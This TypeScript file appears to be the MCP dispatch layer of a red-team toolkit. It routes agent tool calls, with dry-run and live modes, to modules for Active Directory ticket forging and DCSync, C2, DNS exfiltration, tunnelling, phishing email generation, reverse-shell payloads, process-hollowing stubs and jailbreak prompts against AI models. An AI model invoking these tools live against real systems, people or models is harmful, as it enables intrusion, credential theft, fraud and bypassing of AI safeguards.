/**
 * MCP tool dispatch layer — maps MCP handler calls to module functions with unified dry-run/live gates.
 */
import * as security from "./index.ts"
import { resolveDryRun, moduleEnvelope, stubFinding } from "./module_helpers.ts"

type LiveOpts = { live?: boolean; dryRun?: boolean }

export async function adExploitExecute(
  req: { domain: string; technique: string; target?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const base = { dryRun, domain: req.domain }
  const mod = security.ad_exploit
  switch (req.technique) {
    case "dcsync":
      return mod.dcSync(req.target ?? "Administrator", base)
    case "pass_the_hash":
      return mod.passTheHash("whoami", { ...base, ntHash: "aad3b435b51404eeaad3b435b51404ee" })
    case "golden_ticket":
      return mod.forgeGoldenTicket("Administrator", "S-1-5-21-0000000000-0000000000-0000000000", "aad3b435b51404eeaad3b435b51404ee", base)
    case "silver_ticket":
      return mod.forgeSilverTicket("Administrator", "S-1-5-21-0000000000-0000000000-0000000000", "", req.target ?? "HTTP/web", base)
    case "acl_abuse":
      return mod.enumeratePrivilegedUsers(base)
    default:
      return moduleEnvelope(dryRun, { error: `Unknown technique: ${req.technique}` })
  }
}

export async function c2Execute(
  req: { action: string; channel?: string; payload?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  return moduleEnvelope(dryRun, {
    action: req.action,
    channel: req.channel ?? "https",
    beacons: 0,
    status: dryRun ? "simulated" : "no_active_beacons",
    payload: req.payload ?? "",
  }, [stubFinding("c2-status", `C2 ${req.action} via ${req.channel}`, "info", "T1071")])
}

export async function strixExecute(
  req: { url: string; attack: string; payload?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const coord = new security.strix_engine.StrixCoordinator({ live: !dryRun })
  const typeMap: Record<string, "xss_reflection" | "csrf_test" | "sqli_probe" | "form_fuzz" | "auth_bypass"> = {
    xss_probe: "xss_reflection",
    csrf: "csrf_test",
    session_hijack: "form_fuzz",
    dom_clobbering: "form_fuzz",
    prototype_pollution: "sqli_probe",
    ssti: "sqli_probe",
  }
  coord.queue(req.url, typeMap[req.attack] ?? "form_fuzz")
  const jobs = await coord.runAll()
  return moduleEnvelope(dryRun, { jobs, payload: req.payload }, [
    stubFinding(`strix-${req.attack}`, `Strix ${req.attack} against ${req.url}`, "medium", "T1189"),
  ])
}

export async function vulnResearch(
  req: { query: string; limit?: number },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const kev = await security.vuln_research.checkCisaKev(req.query, !dryRun)
  return moduleEnvelope(dryRun, { query: req.query, limit: req.limit ?? 10, inKev: kev })
}

export async function autoResearch(
  req: { target: string; strategy?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  if (req.strategy === "cve" || !req.strategy) {
    const result = await security.auto_research.researchCve(
      { cveId: req.target },
      { dryRun },
    )
    return moduleEnvelope(dryRun, result)
  }
  return moduleEnvelope(dryRun, { target: req.target, strategy: req.strategy, note: "Strategy simulated in dry-run" })
}

export async function hybridAdEntraExecute(
  req: { domain: string; tenantId?: string; technique?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  return moduleEnvelope(dryRun, {
    domain: req.domain,
    tenantId: req.tenantId ?? "",
    technique: req.technique ?? "ssso_token",
  }, [stubFinding("hybrid-ad", `Hybrid AD/Entra ${req.technique}`, "high", "T1556")])
}

export async function oauthChainExecute(
  req: { target: string; technique: string; clientId?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const audit = security.oauth_chain.auditOAuthChain(req.target, { dryRun })
  return moduleEnvelope(dryRun, { ...audit, technique: req.technique, clientId: req.clientId })
}

export async function webmailExploitExecute(
  req: { target: string; technique: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  return moduleEnvelope(dryRun, {
    target: req.target,
    technique: req.technique,
  }, [stubFinding("webmail", `Webmail ${req.technique}`, "high", "T1110")])
}

export async function exfiltrate(
  req: { data: string; channel?: string; endpoint?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  if ((req.channel ?? "dns") === "dns") {
    return security.exfil.exfiltrateDNS(req.data, { live: !dryRun, domain: req.endpoint || "exfil.lab.local" })
  }
  return moduleEnvelope(dryRun, { channel: req.channel, bytes: req.data.length, endpoint: req.endpoint })
}

export async function pivotTunnelExecute(
  req: { method: string; lhost?: string; lport?: number; rhost?: string; rport?: number },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const type = req.method === "chisel" ? "chisel" : req.method === "ssh" ? "port_forward" : "socks5"
  return security.pivot_tunnel.createPortForwarder(
    {
      type,
      localPort: req.lport ?? 1080,
      remoteHost: req.rhost ?? "127.0.0.1",
      remotePort: req.rport ?? 22,
    },
    !dryRun,
  )
}

export async function socialEngGenerate(
  req: { targetName: string; targetEmail?: string; targetCompany?: string; lure?: string; method?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const template = (["it_password_reset", "hr_benefits", "ceo_wire", "sharepoint_file", "mfa_verify"].includes(req.lure ?? "")
    ? req.lure
    : "it_password_reset") as "it_password_reset" | "hr_benefits" | "ceo_wire" | "sharepoint_file" | "mfa_verify"
  const email = security.social_eng.generatePhishingEmail(template, {
    dryRun,
    targetCompany: req.targetCompany,
    targetName: req.targetName,
    targetEmail: req.targetEmail,
  })
  return moduleEnvelope(dryRun, { email, method: req.method ?? "email" })
}

export async function toolkitGeneratePayload(
  req: { type: string; language?: string; lhost?: string; lport?: number; encode?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const payloads = security.multi_lang.generateAllPayloads(req.lhost ?? "127.0.0.1", req.lport ?? 4444, "linux")
  return moduleEnvelope(dryRun, { type: req.type, language: req.language, payloads })
}

export async function malwareDevExecute(
  req: { technique: string; targetProcess?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const stub = security.malware_dev.generateProcessHollowingStub(req.targetProcess ?? "explorer.exe")
  return moduleEnvelope(dryRun, { technique: req.technique, stubLength: stub.length })
}

export async function iotScadaExecute(
  req: { host: string; protocol?: string; action?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  return moduleEnvelope(dryRun, req, [stubFinding("iot", `IoT/SCADA ${req.protocol} on ${req.host}`, "medium", "T0889")])
}

export async function mobileExecute(
  req: { action: string; target?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  return moduleEnvelope(dryRun, req, [stubFinding("mobile", `Mobile ${req.action}`, "medium", "T1406")])
}

export async function firmwareAnalyze(
  req: { path: string; action?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  return moduleEnvelope(dryRun, { path: req.path, action: req.action ?? "extract" })
}

export async function calderaTtpExecute(
  req: { techniqueId: string; profile?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  return moduleEnvelope(dryRun, { techniqueId: req.techniqueId, profile: req.profile, note: "Caldera ability execution simulated" })
}

export async function atlasArsenalExecute(
  req: { attack: string; modelUrl?: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  const prompts = await security.atlas_arsenal.generateJailbreakPrompts(req.modelUrl, dryRun)
  return moduleEnvelope(dryRun, { attack: req.attack, prompts })
}

export async function devTargetExecute(
  req: { target: string; technique: string },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  return moduleEnvelope(dryRun, req, [stubFinding("dev-target", `Dev target ${req.technique}`, "low", "T1195")])
}

export async function campaignPlan(
  req: { target: string; objective?: string; phases?: string[] },
  opts: LiveOpts = {},
) {
  const dryRun = resolveDryRun(opts)
  return moduleEnvelope(dryRun, {
    target: req.target,
    objective: req.objective ?? "recon",
    phases: req.phases ?? ["recon", "initial_access", "impact"],
  }, [stubFinding("campaign", `Campaign plan for ${req.target}`, "info", "T1595")])
}
